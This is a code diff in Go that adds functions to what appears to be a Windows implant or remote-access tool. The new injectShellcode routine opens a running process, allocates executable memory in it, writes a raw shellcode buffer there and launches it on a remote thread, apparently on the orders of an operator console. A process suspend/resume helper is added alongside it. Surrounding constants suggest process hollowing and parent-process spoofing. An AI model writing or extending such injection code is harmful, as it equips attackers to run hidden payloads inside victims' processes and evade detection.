@@ -26,21 +26,74 @@ var (
 	pThread32F    = k32.NewProc("Thread32First")
 	pThread32N    = k32.NewProc("Thread32Next")
 	pWinExec      = k32.NewProc("WinExec")
+	pNtSuspend    = ntdll.NewProc("NtSuspendProcess")
+	pNtResume     = ntdll.NewProc("NtResumeProcess")
 )
 
 const (
-	procAllAccess  = 0x1F0FFF
-	memCommit      = 0x1000
-	memReserve     = 0x2000
-	pageRWX        = 0x40
-	createSusp     = 0x00000004
-	extStartInfo   = 0x00080000
-	th32SnapThread = 0x00000004
-	threadSetCtx   = 0x0010
-	threadSuspend  = 0x0002
-	threadQuery    = 0x0040
-	attrParentProc = 0x00020000
+	procAllAccess   = 0x1F0FFF
+	procSuspendRes  = 0x0800
+	memCommit       = 0x1000
+	memReserve      = 0x2000
+	pageRWX         = 0x40
+	createSusp      = 0x00000004
+	extStartInfo    = 0x00080000
+	th32SnapThread  = 0x00000004
+	threadSetCtx    = 0x0010
+	threadSuspend   = 0x0002
+	threadQuery     = 0x0040
+	attrParentProc  = 0x00020000
 )
+
+// injectShellcode drops a raw buffer into a live process and starts it on a new
+// thread. Used by the console's process-inject action.
+func injectShellcode(pid uint32, sc []byte) bool {
+	if pid == 0 || len(sc) == 0 || len(sc) > 8<<20 {
+		return false
+	}
+	proc, _, _ := pOpenProc.Call(procAllAccess, 0, uintptr(pid))
+	if proc == 0 {
+		return false
+	}
+	defer pCloseH.Call(proc)
+	addr, _, _ := pVirtAllocEx.Call(proc, 0, uintptr(len(sc)+16), memCommit|memReserve, pageRWX)
+	if addr == 0 {
+		return false
+	}
+	var wrote uintptr
+	pWriteMem.Call(proc, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&wrote)))
+	if wrote == 0 {
+		return false
+	}
+	th, _, _ := pCreateRT.Call(proc, 0, 0, addr, 0, 0, 0)
+	if th == 0 {
+		return false
+	}
+	pCloseH.Call(th)
+	return true
+}
+
+// processSuspendResume toggles a process's threads via ntdll. Returns true on
+// NTSTATUS STATUS_SUCCESS.
+func processSuspendResume(pid uint32, suspend bool) bool {
+	if pid == 0 {
+		return false
+	}
+	proc, _, _ := pOpenProc.Call(procSuspendRes, 0, uintptr(pid))
+	if proc == 0 {
+		return false
+	}
+	defer pCloseH.Call(proc)
+	proc_ := pNtSuspend
+	if !suspend {
+		proc_ = pNtResume
+	}
+	if proc_.Find() != nil {
+		return false
+	}
+	r, _, _ := proc_.Call(proc)
+	return r == 0 // NTSTATUS 0 == STATUS_SUCCESS
+}
 
 type procEntry32 struct {
 	Size            uint32
